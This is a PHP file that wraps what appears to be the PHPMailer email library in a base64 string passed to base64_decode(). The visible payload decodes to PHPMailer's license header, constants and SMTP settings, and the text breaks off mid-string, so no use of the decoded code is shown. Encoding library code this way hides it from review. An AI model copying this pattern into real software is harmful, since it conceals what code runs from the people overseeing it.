<?php
$code = base64_decode('PD9waHAKCi8qKgogKiBQSFBNYWlsZXIgLSBQSFAgZW1haWwgY3JlYXRpb24gYW5kIHRyYW5zcG9ydCBjbGFzcy4KICogUEhQIFZlcnNpb24gNS41LgogKgogKiBAc2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9QSFBNYWlsZXIvUEhQTWFpbGVyLyBUaGUgUEhQTWFpbGVyIEdpdEh1YiBwcm9qZWN0CiAqCiAqIEBhdXRob3IgICAgTWFyY3VzIEJvaW50b24gKFN5bmNocm8vY29vbGJydSkgPHBocG1haWxlckBzeW5jaHJvbWVkaWEuY28udWs+CiAqIEBhdXRob3IgICAgSmltIEphZ2llbHNraSAoamltamFnKSA8amltamFnQGdtYWlsLmNvbT4KICogQGF1dGhvciAgICBBbmR5IFByZXZvc3QgKGNvZGV3b3J4dGVjaCkgPGNvZGV3b3J4dGVjaEB1c2Vycy5zb3VyY2Vmb3JnZS5uZXQ+CiAqIEBhdXRob3IgICAgQnJlbnQgUi4gTWF0emVsbGUgKG9yaWdpbmFsIGZvdW5kZXIpCiAqIEBjb3B5cmlnaHQgMjAxMiAtIDIwMjAgTWFyY3VzIEJvaW50b24KICogQGNvcHlyaWdodCAyMDEwIC0gMjAxMiBKaW0gSmFnaWVsc2tpCiAqIEBjb3B5cmlnaHQgMjAwNCAtIDIwMDkgQW5keSBQcmV2b3N0CiAqIEBsaWNlbnNlICAgaHR0cHM6Ly93d3cuZ251Lm9yZy9saWNlbnNlcy9vbGQtbGljZW5zZXMvbGdwbC0yLjEuaHRtbCBHTlUgTGVzc2VyIEdlbmVyYWwgUHVibGljIExpY2Vuc2UKICogQG5vdGUgICAgICBUaGlzIHByb2dyYW0gaXMgZGlzdHJpYnV0ZWQgaW4gdGhlIGhvcGUgdGhhdCBpdCB3aWxsIGJlIHVzZWZ1bCAtIFdJVEhPVVQKICogQU5ZIFdBUlJBTlRZOyB3aXRob3V0IGV2ZW4gdGhlIGltcGxpZWQgd2FycmFudHkgb2YgTUVSQ0hBTlRBQklMSVRZIG9yCiAqIEZJVE5FU1MgRk9SIEEgUEFSVElDVUxBUiBQVVJQT1NFLgogKi8KCm5hbWVzcGFjZSBQSFBNYWlsZXJcUEhQTWFpbGVyOwoKLyoqCiAqIFBIUE1haWxlciAtIFBIUCBlbWFpbCBjcmVhdGlvbiBhbmQgdHJhbnNwb3J0IGNsYXNzLgogKgogKiBAYXV0aG9yIE1hcmN1cyBCb2ludG9uIChTeW5jaHJvL2Nvb2xicnUpIDxwaHBtYWlsZXJAc3luY2hyb21lZGlhLmNvLnVrPgogKiBAYXV0aG9yIEppbSBKYWdpZWxza2kgKGppbWphZykgPGppbWphZ0BnbWFpbC5jb20+CiAqIEBhdXRob3IgQW5keSBQcmV2b3N0IChjb2Rld29yeHRlY2gpIDxjb2Rld29yeHRlY2hAdXNlcnMuc291cmNlZm9yZ2UubmV0PgogKiBAYXV0aG9yIEJyZW50IFIuIE1hdHplbGxlIChvcmlnaW5hbCBmb3VuZGVyKQogKi8KY2xhc3MgUEhQTWFpbGVyCnsKICAgIGNvbnN0IENIQVJTRVRfQVNDSUkgPSAndXMtYXNjaWknOwogICAgY29uc3QgQ0hBUlNFVF9JU084ODU5MSA9ICdpc28tODg1OS0xJzsKICAgIGNvbnN0IENIQVJTRVRfVVRGOCA9ICd1dGYtOCc7CgogICAgY29uc3QgQ09OVEVOVF9UWVBFX1BMQUlOVEVYVCA9ICd0ZXh0L3BsYWluJzsKICAgIGNvbnN0IENPTlRFTlRfVFlQRV9URVhUX0NBTEVOREFSID0gJ3RleHQvY2FsZW5kYXInOwogICAgY29uc3QgQ09OVEVOVF9UWVBFX1RFWFRfSFRNTCA9ICd0ZXh0L2h0bWwnOwogICAgY29uc3QgQ09OVEVOVF9UWVBFX01VTFRJUEFSVF9BTFRFUk5BVElWRSA9ICdtdWx0aXBhcnQvYWx0ZXJuYXRpdmUnOwogICAgY29uc3QgQ09OVEVOVF9UWVBFX01VTFRJUEFSVF9NSVhFRCA9ICdtdWx0aXBhcnQvbWl4ZWQnOwogICAgY29uc3QgQ09OVEVOVF9UWVBFX01VTFRJUEFSVF9SRUxBVEVEID0gJ211bHRpcGFydC9yZWxhdGVkJzsKCiAgICBjb25zdCBFTkNPRElOR183QklUID0gJzdiaXQnOwogICAgY29uc3QgRU5DT0RJTkdfOEJJVCA9ICc4Yml0JzsKICAgIGNvbnN0IEVOQ09ESU5HX0JBU0U2NCA9ICdiYXNlNjQnOwogICAgY29uc3QgRU5DT0RJTkdfQklOQVJZID0gJ2JpbmFyeSc7CiAgICBjb25zdCBFTkNPRElOR19RVU9URURfUFJJTlRBQkxFID0gJ3F1b3RlZC1wcmludGFibGUnOwoKICAgIGNvbnN0IEVOQ1JZUFRJT05fU1RBUlRUTFMgPSAndGxzJzsKICAgIGNvbnN0IEVOQ1JZUFRJT05fU01UUFMgPSAnc3NsJzsKCiAgICBjb25zdCBJQ0FMX01FVEhPRF9SRVFVRVNUID0gJ1JFUVVFU1QnOwogICAgY29uc3QgSUNBTF9NRVRIT0RfUFVCTElTSCA9ICdQVUJMSVNIJzsKICAgIGNvbnN0IElDQUxfTUVUSE9EX1JFUExZID0gJ1JFUExZJzsKICAgIGNvbnN0IElDQUxfTUVUSE9EX0FERCA9ICdBREQnOwogICAgY29uc3QgSUNBTF9NRVRIT0RfQ0FOQ0VMID0gJ0NBTkNFTCc7CiAgICBjb25zdCBJQ0FMX01FVEhPRF9SRUZSRVNIID0gJ1JFRlJFU0gnOwogICAgY29uc3QgSUNBTF9NRVRIT0RfQ09VTlRFUiA9ICdDT1VOVEVSJzsKICAgIGNvbnN0IElDQUxfTUVUSE9EX0RFQ0xJTkVDT1VOVEVSID0gJ0RFQ0xJTkVDT1VOVEVSJzsKCiAgICAvKioKICAgICAqIEVtYWlsIHByaW9yaXR5LgogICAgICogT3B0aW9uczogbnVsbCAoZGVmYXVsdCksIDEgPSBIaWdoLCAzID0gTm9ybWFsLCA1ID0gbG93LgogICAgICogV2hlbiBudWxsLCB0aGUgaGVhZGVyIGlzIG5vdCBzZXQgYXQgYWxsLgogICAgICoKICAgICAqIEB2YXIgaW50fG51bGwKICAgICAqLwogICAgcHVibGljICRQcmlvcml0eTsKCiAgICAvKioKICAgICAqIFRoZSBjaGFyYWN0ZXIgc2V0IG9mIHRoZSBtZXNzYWdlLgogICAgICoKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkQ2hhclNldCA9IHNlbGY6OkNIQVJTRVRfSVNPODg1OTE7CgogICAgLyoqCiAgICAgKiBUaGUgTUlNRSBDb250ZW50LXR5cGUgb2YgdGhlIG1lc3NhZ2UuCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRDb250ZW50VHlwZSA9IHNlbGY6OkNPTlRFTlRfVFlQRV9QTEFJTlRFWFQ7CgogICAgLyoqCiAgICAgKiBUaGUgbWVzc2FnZSBlbmNvZGluZy4KICAgICAqIE9wdGlvbnM6ICI4Yml0IiwgIjdiaXQiLCAiYmluYXJ5IiwgImJhc2U2NCIsIGFuZCAicXVvdGVkLXByaW50YWJsZSIuCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRFbmNvZGluZyA9IHNlbGY6OkVOQ09ESU5HXzhCSVQ7CgogICAgLyoqCiAgICAgKiBIb2xkcyB0aGUgbW9zdCByZWNlbnQgbWFpbGVyIGVycm9yIG1lc3NhZ2UuCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRFcnJvckluZm8gPSAnJzsKCiAgICAvKioKICAgICAqIFRoZSBGcm9tIGVtYWlsIGFkZHJlc3MgZm9yIHRoZSBtZXNzYWdlLgogICAgICoKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkRnJvbSA9ICcnOwoKICAgIC8qKgogICAgICogVGhlIEZyb20gbmFtZSBvZiB0aGUgbWVzc2FnZS4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJEZyb21OYW1lID0gJyc7CgogICAgLyoqCiAgICAgKiBUaGUgZW52ZWxvcGUgc2VuZGVyIG9mIHRoZSBtZXNzYWdlLgogICAgICogVGhpcyB3aWxsIHVzdWFsbHkgYmUgdHVybmVkIGludG8gYSBSZXR1cm4tUGF0aCBoZWFkZXIgYnkgdGhlIHJlY2VpdmVyLAogICAgICogYW5kIGlzIHRoZSBhZGRyZXNzIHRoYXQgYm91bmNlcyB3aWxsIGJlIHNlbnQgdG8uCiAgICAgKiBJZiBub3QgZW1wdHksIHdpbGwgYmUgcGFzc2VkIHZpYSBgLWZgIHRvIHNlbmRtYWlsIG9yIGFzIHRoZSAnTUFJTCBGUk9NJyB2YWx1ZSBvdmVyIFNNVFAuCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRTZW5kZXIgPSAnJzsKCiAgICAvKioKICAgICAqIFRoZSBTdWJqZWN0IG9mIHRoZSBtZXNzYWdlLgogICAgICoKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkU3ViamVjdCA9ICcnOwoKICAgIC8qKgogICAgICogQW4gSFRNTCBvciBwbGFpbiB0ZXh0IG1lc3NhZ2UgYm9keS4KICAgICAqIElmIEhUTUwgdGhlbiBjYWxsIGlzSFRNTCh0cnVlKS4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJEJvZHkgPSAnJzsKCiAgICAvKioKICAgICAqIFRoZSBwbGFpbi10ZXh0IG1lc3NhZ2UgYm9keS4KICAgICAqIFRoaXMgYm9keSBjYW4gYmUgcmVhZCBieSBtYWlsIGNsaWVudHMgdGhhdCBkbyBub3QgaGF2ZSBIVE1MIGVtYWlsCiAgICAgKiBjYXBhYmlsaXR5IHN1Y2ggYXMgbXV0dCAmIEV1ZG9yYS4KICAgICAqIENsaWVudHMgdGhhdCBjYW4gcmVhZCBIVE1MIHdpbGwgdmlldyB0aGUgbm9ybWFsIEJvZHkuCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRBbHRCb2R5ID0gJyc7CgogICAgLyoqCiAgICAgKiBBbiBpQ2FsIG1lc3NhZ2UgcGFydCBib2R5LgogICAgICogT25seSBzdXBwb3J0ZWQgaW4gc2ltcGxlIGFsdCBvciBhbHRfaW5saW5lIG1lc3NhZ2UgdHlwZXMKICAgICAqIFRvIGdlbmVyYXRlIGlDYWwgZXZlbnQgc3RydWN0dXJlcywgdXNlIGNsYXNzZXMgbGlrZSBFYXN5UGVhc3lJQ1Mgb3IgaUNhbGNyZWF0b3IuCiAgICAgKgogICAgICogQHNlZSBodHRwczovL2tpZ2tvbnN1bHQuc2UvaUNhbGNyZWF0b3IvCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRJY2FsID0gJyc7CgogICAgLyoqCiAgICAgKiBWYWx1ZS1hcnJheSBvZiAibWV0aG9kIiBpbiBDb250ZW50dHlwZSBoZWFkZXIgInRleHQvY2FsZW5kYXIiCiAgICAgKgogICAgICogQHZhciBzdHJpbmdbXQogICAgICovCiAgICBwcm90ZWN0ZWQgc3RhdGljICRJY2FsTWV0aG9kcyA9IFsKICAgICAgICBzZWxmOjpJQ0FMX01FVEhPRF9SRVFVRVNULAogICAgICAgIHNlbGY6OklDQUxfTUVUSE9EX1BVQkxJU0gsCiAgICAgICAgc2VsZjo6SUNBTF9NRVRIT0RfUkVQTFksCiAgICAgICAgc2VsZjo6SUNBTF9NRVRIT0RfQURELAogICAgICAgIHNlbGY6OklDQUxfTUVUSE9EX0NBTkNFTCwKICAgICAgICBzZWxmOjpJQ0FMX01FVEhPRF9SRUZSRVNILAogICAgICAgIHNlbGY6OklDQUxfTUVUSE9EX0NPVU5URVIsCiAgICAgICAgc2VsZjo6SUNBTF9NRVRIT0RfREVDTElORUNPVU5URVIsCiAgICBdOwoKICAgIC8qKgogICAgICogVGhlIGNvbXBsZXRlIGNvbXBpbGVkIE1JTUUgbWVzc2FnZSBib2R5LgogICAgICoKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHByb3RlY3RlZCAkTUlNRUJvZHkgPSAnJzsKCiAgICAvKioKICAgICAqIFRoZSBjb21wbGV0ZSBjb21waWxlZCBNSU1FIG1lc3NhZ2UgaGVhZGVycy4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwcm90ZWN0ZWQgJE1JTUVIZWFkZXIgPSAnJzsKCiAgICAvKioKICAgICAqIEV4dHJhIGhlYWRlcnMgdGhhdCBjcmVhdGVIZWFkZXIoKSBkb2Vzbid0IGZvbGQgaW4uCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkICRtYWlsSGVhZGVyID0gJyc7CgogICAgLyoqCiAgICAgKiBXb3JkLXdyYXAgdGhlIG1lc3NhZ2UgYm9keSB0byB0aGlzIG51bWJlciBvZiBjaGFycy4KICAgICAqIFNldCB0byAwIHRvIG5vdCB3cmFwLiBBIHVzZWZ1bCB2YWx1ZSBoZXJlIGlzIDc4LCBmb3IgUkZDMjgyMiBzZWN0aW9uIDIuMS4xIGNvbXBsaWFuY2UuCiAgICAgKgogICAgICogQHNlZSBzdGF0aWM6OlNURF9MSU5FX0xFTkdUSAogICAgICoKICAgICAqIEB2YXIgaW50CiAgICAgKi8KICAgIHB1YmxpYyAkV29yZFdyYXAgPSAwOwoKICAgIC8qKgogICAgICogV2hpY2ggbWV0aG9kIHRvIHVzZSB0byBzZW5kIG1haWwuCiAgICAgKiBPcHRpb25zOiAibWFpbCIsICJzZW5kbWFpbCIsIG9yICJzbXRwIi4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJE1haWxlciA9ICdtYWlsJzsKCiAgICAvKioKICAgICAqIFRoZSBwYXRoIHRvIHRoZSBzZW5kbWFpbCBwcm9ncmFtLgogICAgICoKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkU2VuZG1haWwgPSAnL3Vzci9zYmluL3NlbmRtYWlsJzsKCiAgICAvKioKICAgICAqIFdoZXRoZXIgbWFpbCgpIHVzZXMgYSBmdWxseSBzZW5kbWFpbC1jb21wYXRpYmxlIE1UQS4KICAgICAqIE9uZSB3aGljaCBzdXBwb3J0cyBzZW5kbWFpbCdzICItb2kgLWYiIG9wdGlvbnMuCiAgICAgKgogICAgICogQHZhciBib29sCiAgICAgKi8KICAgIHB1YmxpYyAkVXNlU2VuZG1haWxPcHRpb25zID0gdHJ1ZTsKCiAgICAvKioKICAgICAqIFRoZSBlbWFpbCBhZGRyZXNzIHRoYXQgYSByZWFkaW5nIGNvbmZpcm1hdGlvbiBzaG91bGQgYmUgc2VudCB0bywgYWxzbyBrbm93biBhcyByZWFkIHJlY2VpcHQuCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRDb25maXJtUmVhZGluZ1RvID0gJyc7CgogICAgLyoqCiAgICAgKiBUaGUgaG9zdG5hbWUgdG8gdXNlIGluIHRoZSBNZXNzYWdlLUlEIGhlYWRlciBhbmQgYXMgZGVmYXVsdCBIRUxPIHN0cmluZy4KICAgICAqIElmIGVtcHR5LCBQSFBNYWlsZXIgYXR0ZW1wdHMgdG8gZmluZCBvbmUgd2l0aCwgaW4gb3JkZXIsCiAgICAgKiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSwgZ2V0aG9zdG5hbWUoKSwgcGhwX3VuYW1lKCduJyksIG9yIHRoZSB2YWx1ZQogICAgICogJ2xvY2FsaG9zdC5sb2NhbGRvbWFpbicuCiAgICAgKgogICAgICogQHNlZSBQSFBNYWlsZXI6OiRIZWxvCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRIb3N0bmFtZSA9ICcnOwoKICAgIC8qKgogICAgICogQW4gSUQgdG8gYmUgdXNlZCBpbiB0aGUgTWVzc2FnZS1JRCBoZWFkZXIuCiAgICAgKiBJZiBlbXB0eSwgYSB1bmlxdWUgaWQgd2lsbCBiZSBnZW5lcmF0ZWQuCiAgICAgKiBZb3UgY2FuIHNldCB5b3VyIG93biwgYnV0IGl0IG11c3QgYmUgaW4gdGhlIGZvcm1hdCAiPGlkQGRvbWFpbj4iLAogICAgICogYXMgZGVmaW5lZCBpbiBSRkM1MzIyIHNlY3Rpb24gMy42LjQgb3IgaXQgd2lsbCBiZSBpZ25vcmVkLgogICAgICoKICAgICAqIEBzZWUgaHR0cHM6Ly93d3cucmZjLWVkaXRvci5vcmcvcmZjL3JmYzUzMjIjc2VjdGlvbi0zLjYuNAogICAgICoKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkTWVzc2FnZUlEID0gJyc7CgogICAgLyoqCiAgICAgKiBUaGUgbWVzc2FnZSBEYXRlIHRvIGJlIHVzZWQgaW4gdGhlIERhdGUgaGVhZGVyLgogICAgICogSWYgZW1wdHksIHRoZSBjdXJyZW50IGRhdGUgd2lsbCBiZSBhZGRlZC4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJE1lc3NhZ2VEYXRlID0gJyc7CgogICAgLyoqCiAgICAgKiBTTVRQIGhvc3RzLgogICAgICogRWl0aGVyIGEgc2luZ2xlIGhvc3RuYW1lIG9yIG11bHRpcGxlIHNlbWljb2xvbi1kZWxpbWl0ZWQgaG9zdG5hbWVzLgogICAgICogWW91IGNhbiBhbHNvIHNwZWNpZnkgYSBkaWZmZXJlbnQgcG9ydAogICAgICogZm9yIGVhY2ggaG9zdCBieSB1c2luZyB0aGlzIGZvcm1hdDogW2hvc3RuYW1lOnBvcnRdCiAgICAgKiAoZS5nLiAic210cDEuZXhhbXBsZS5jb206MjU7c210cDIuZXhhbXBsZS5jb20iKS4KICAgICAqIFlvdSBjYW4gYWxzbyBzcGVjaWZ5IGVuY3J5cHRpb24gdHlwZSwgZm9yIGV4YW1wbGU6CiAgICAgKiAoZS5nLiAidGxzOi8vc210cDEuZXhhbXBsZS5jb206NTg3O3NzbDovL3NtdHAyLmV4YW1wbGUuY29tOjQ2NSIpLgogICAgICogSG9zdHMgd2lsbCBiZSB0cmllZCBpbiBvcmRlci4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJEhvc3QgPSAnbG9jYWxob3N0JzsKCiAgICAvKioKICAgICAqIFRoZSBkZWZhdWx0IFNNVFAgc2VydmVyIHBvcnQuCiAgICAgKgogICAgICogQHZhciBpbnQKICAgICAqLwogICAgcHVibGljICRQb3J0ID0gMjU7CgogICAgLyoqCiAgICAgKiBUaGUgU01UUCBIRUxPL0VITE8gbmFtZSB1c2VkIGZvciB0aGUgU01UUCBjb25uZWN0aW9uLgogICAgICogRGVmYXVsdCBpcyAkSG9zdG5hbWUuIElmICRIb3N0bmFtZSBpcyBlbXB0eSwgUEhQTWFpbGVyIGF0dGVtcHRzIHRvIGZpbmQKICAgICAqIG9uZSB3aXRoIHRoZSBzYW1lIG1ldGhvZCBkZXNjcmliZWQgYWJvdmUgZm9yICRIb3N0bmFtZS4KICAgICAqCiAgICAgKiBAc2VlIFBIUE1haWxlcjo6JEhvc3RuYW1lCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRIZWxvID0gJyc7CgogICAgLyoqCiAgICAgKiBXaGF0IGtpbmQgb2YgZW5jcnlwdGlvbiB0byB1c2Ugb24gdGhlIFNNVFAgY29ubmVjdGlvbi4KICAgICAqIE9wdGlvbnM6ICcnLCBzdGF0aWM6OkVOQ1JZUFRJT05fU1RBUlRUTFMsIG9yIHN0YXRpYzo6RU5DUllQVElPTl9TTVRQUy4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJFNNVFBTZWN1cmUgPSAnJzsKCiAgICAvKioKICAgICAqIFdoZXRoZXIgdG8gZW5hYmxlIFRMUyBlbmNyeXB0aW9uIGF1dG9tYXRpY2FsbHkgaWYgYSBzZXJ2ZXIgc3VwcG9ydHMgaXQsCiAgICAgKiBldmVuIGlmIGBTTVRQU2VjdXJlYCBpcyBub3Qgc2V0IHRvICd0bHMnLgogICAgICogQmUgYXdhcmUgdGhhdCBpbiBQSFAgPj0gNS42IHRoaXMgcmVxdWlyZXMgdGhhdCB0aGUgc2VydmVyJ3MgY2VydGlmaWNhdGVzIGFyZSB2YWxpZC4KICAgICAqCiAgICAgKiBAdmFyIGJvb2wKICAgICAqLwogICAgcHVibGljICRTTVRQQXV0b1RMUyA9IHRydWU7CgogICAgLyoqCiAgICAgKiBXaGV0aGVyIHRvIHVzZSBTTVRQIGF1dGhlbnRpY2F0aW9uLgogICAgICogVXNlcyB0aGUgVXNlcm5hbWUgYW5kIFBhc3N3b3JkIHByb3BlcnRpZXMuCiAgICAgKgogICAgICogQHNlZSBQSFBNYWlsZXI6OiRVc2VybmFtZQogICAgICogQHNlZSBQSFBNYWlsZXI6OiRQYXNzd29yZAogICAgICoKICAgICAqIEB2YXIgYm9vbAogICAgICovCiAgICBwdWJsaWMgJFNNVFBBdXRoID0gZmFsc2U7CgogICAgLyoqCiAgICAgKiBPcHRpb25zIGFycmF5IHBhc3NlZCB0byBzdHJlYW1fY29udGV4dF9jcmVhdGUgd2hlbiBjb25uZWN0aW5nIHZpYSBTTVRQLgogICAgICoKICAgICAqIEB2YXIgYXJyYXkKICAgICAqLwogICAgcHVibGljICRTTVRQT3B0aW9ucyA9IFtdOwoKICAgIC8qKgogICAgICogU01UUCB1c2VybmFtZS4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJFVzZXJuYW1lID0gJyc7CgogICAgLyoqCiAgICAgKiBTTVRQIHBhc3N3b3JkLgogICAgICoKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkUGFzc3dvcmQgPSAnJzsKCiAgICAvKioKICAgICAqIFNNVFAgYXV0aGVudGljYXRpb24gdHlwZS4gT3B0aW9ucyBhcmUgQ1JBTS1NRDUsIExPR0lOLCBQTEFJTiwgWE9BVVRIMi4KICAgICAqIElmIG5vdCBzcGVjaWZpZWQsIHRoZSBmaXJzdCBvbmUgZnJvbSB0aGF0IGxpc3QgdGhhdCB0aGUgc2VydmVyIHN1cHBvcnRzIHdpbGwgYmUgc2VsZWN0ZWQuCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRBdXRoVHlwZSA9ICcnOwoKICAgIC8qKgogICAgICogU01UUCBTTVRQWENsaWVudCBjb21tYW5kIGF0dHJpYnV0ZXMKICAgICAqCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKi8KICAgIHByb3RlY3RlZCAkU01UUFhDbGllbnQgPSBbXTsKCiAgICAvKioKICAgICAqIEFuIGltcGxlbWVudGF0aW9uIG9mIHRoZSBQSFBNYWlsZXIgT0F1dGhUb2tlblByb3ZpZGVyIGludGVyZmFjZS4KICAgICAqCiAgICAgKiBAdmFyIE9BdXRoVG9rZW5Qcm92aWRlcgogICAgICovCiAgICBwcm90ZWN0ZWQgJG9hdXRoOwoKICAgIC8qKgogICAgICogVGhlIFNNVFAgc2VydmVyIHRpbWVvdXQgaW4gc2Vjb25kcy4KICAgICAqIERlZmF1bHQgb2YgNSBtaW51dGVzICgzMDBzZWMpIGlzIGZyb20gUkZDMjgyMSBzZWN0aW9uIDQuNS4zLjIuCiAgICAgKgogICAgICogQHZhciBpbnQKICAgICAqLwogICAgcHVibGljICRUaW1lb3V0ID0gMzAwOwoKICAgIC8qKgogICAgICogQ29tbWEgc2VwYXJhdGVkIGxpc3Qgb2YgRFNOIG5vdGlmaWNhdGlvbnMKICAgICAqICdORVZFUicgdW5kZXIgbm8gY2lyY3Vtc3RhbmNlcyBhIERTTiBtdXN0IGJlIHJldHVybmVkIHRvIHRoZSBzZW5kZXIuCiAgICAgKiAgICAgICAgIElmIHlvdSB1c2UgTkVWRVIgYWxsIG90aGVyIG5vdGlmaWNhdGlvbnMgd2lsbCBiZSBpZ25vcmVkLgogICAgICogJ1NVQ0NFU1MnIHdpbGwgbm90aWZ5IHlvdSB3aGVuIHlvdXIgbWFpbCBoYXMgYXJyaXZlZCBhdCBpdHMgZGVzdGluYXRpb24uCiAgICAgKiAnRkFJTFVSRScgd2lsbCBhcnJpdmUgaWYgYW4gZXJyb3Igb2NjdXJyZWQgZHVyaW5nIGRlbGl2ZXJ5LgogICAgICogJ0RFTEFZJyAgIHdpbGwgbm90aWZ5IHlvdSBpZiB0aGVyZSBpcyBhbiB1bnVzdWFsIGRlbGF5IGluIGRlbGl2ZXJ5LCBidXQgdGhlIGFjdHVhbAogICAgICogICAgICAgICAgIGRlbGl2ZXJ5J3Mgb3V0Y29tZSAoc3VjY2VzcyBvciBmYWlsdXJlKSBpcyBub3QgeWV0IGRlY2lkZWQuCiAgICAgKgogICAgICogQHNlZSBodHRwczovL3d3dy5yZmMtZWRpdG9yLm9yZy9yZmMvcmZjMzQ2MS5odG1sI3NlY3Rpb24tNC4xIGZvciBtb3JlIGluZm9ybWF0aW9uIGFib3V0IE5PVElGWQogICAgICovCiAgICBwdWJsaWMgJGRzbiA9ICcnOwoKICAgIC8qKgogICAgICogU01UUCBjbGFzcyBkZWJ1ZyBvdXRwdXQgbW9kZS4KICAgICAqIERlYnVnIG91dHB1dCBsZXZlbC4KICAgICAqIE9wdGlvbnM6CiAgICAgKiBAc2VlIFNNVFA6OkRFQlVHX09GRjogTm8gb3V0cHV0CiAgICAgKiBAc2VlIFNNVFA6OkRFQlVHX0NMSUVOVDogQ2xpZW50IG1lc3NhZ2VzCiAgICAgKiBAc2VlIFNNVFA6OkRFQlVHX1NFUlZFUjogQ2xpZW50IGFuZCBzZXJ2ZXIgbWVzc2FnZXMKICAgICAqIEBzZWUgU01UUDo6REVCVUdfQ09OTkVDVElPTjogQXMgU0VSVkVSIHBsdXMgY29ubmVjdGlvbiBzdGF0dXMKICAgICAqIEBzZWUgU01UUDo6REVCVUdfTE9XTEVWRUw6IE5vaXN5LCBsb3ctbGV2ZWwgZGF0YSBvdXRwdXQsIHJhcmVseSBuZWVkZWQKICAgICAqCiAgICAgKiBAc2VlIFNNVFA6OiRkb19kZWJ1ZwogICAgICoKICAgICAqIEB2YXIgaW50CiAgICAgKi8KICAgIHB1YmxpYyAkU01UUERlYnVnID0gMDsKCiAgICAvKioKICAgICAqIEhvdyB0byBoYW5kbGUgZGVidWcgb3V0cHV0LgogICAgICogT3B0aW9uczoKICAgICAqICogYGVjaG9gIE91dHB1dCBwbGFpbi10ZXh0IGFzLWlzLCBhcHByb3ByaWF0ZSBmb3IgQ0xJCiAgICAgKiAqIGBodG1sYCBPdXRwdXQgZXNjYXBlZCwgbGluZSBicmVha3MgY29udmVydGVkIHRvIGA8YnI+YCwgYXBwcm9wcmlhdGUgZm9yIGJyb3dzZXIgb3V0cHV0CiAgICAgKiAqIGBlcnJvcl9sb2dgIE91dHB1dCB0byBlcnJvciBsb2cgYXMgY29uZmlndXJlZCBpbiBwaHAuaW5pCiAgICAgKiBCeSBkZWZhdWx0IFBIUE1haWxlciB3aWxsIHVzZSBgZWNob2AgaWYgcnVuIGZyb20gYSBgY2xpYCBvciBgY2xpLXNlcnZlcmAgU0FQSSwgYGh0bWxgIG90aGVyd2lzZS4KICAgICAqIEFsdGVybmF0aXZlbHksIHlvdSBjYW4gcHJvdmlkZSBhIGNhbGxhYmxlIGV4cGVjdGluZyB0d28gcGFyYW1zOiBhIG1lc3NhZ2Ugc3RyaW5nIGFuZCB0aGUgZGVidWcgbGV2ZWw6CiAgICAgKgogICAgICogYGBgcGhwCiAgICAgKiAkbWFpbC0+RGVidWdvdXRwdXQgPSBmdW5jdGlvbigkc3RyLCAkbGV2ZWwpIHtlY2hvICJkZWJ1ZyBsZXZlbCAkbGV2ZWw7IG1lc3NhZ2U6ICRzdHIiO307CiAgICAgKiBgYGAKICAgICAqCiAgICAgKiBBbHRlcm5hdGl2ZWx5LCB5b3UgY2FuIHBhc3MgaW4gYW4gaW5zdGFuY2Ugb2YgYSBQU1ItMyBjb21wYXRpYmxlIGxvZ2dlciwgdGhvdWdoIG9ubHkgYGRlYnVnYAogICAgICogbGV2ZWwgb3V0cHV0IGlzIHVzZWQ6CiAgICAgKgogICAgICogYGBgcGhwCiAgICAgKiAkbWFpbC0+RGVidWdvdXRwdXQgPSBuZXcgbXlQc3IzTG9nZ2VyOwogICAgICogYGBgCiAgICAgKgogICAgICogQHNlZSBTTVRQOjokRGVidWdvdXRwdXQKICAgICAqCiAgICAgKiBAdmFyIHN0cmluZ3xjYWxsYWJsZXxcUHNyXExvZ1xMb2dnZXJJbnRlcmZhY2UKICAgICAqLwogICAgcHVibGljICREZWJ1Z291dHB1dCA9ICdlY2hvJzsKCiAgICAvKioKICAgICAqIFdoZXRoZXIgdG8ga2VlcCB0aGUgU01UUCBjb25uZWN0aW9uIG9wZW4gYWZ0ZXIgZWFjaCBtZXNzYWdlLgogICAgICogSWYgdGhpcyBpcyBzZXQgdG8gdHJ1ZSB0aGVuIHRoZSBjb25uZWN0aW9uIHdpbGwgcmVtYWluIG9wZW4gYWZ0ZXIgYSBzZW5kLAogICAgICogYW5kIGNsb3NpbmcgdGhlIGNvbm5l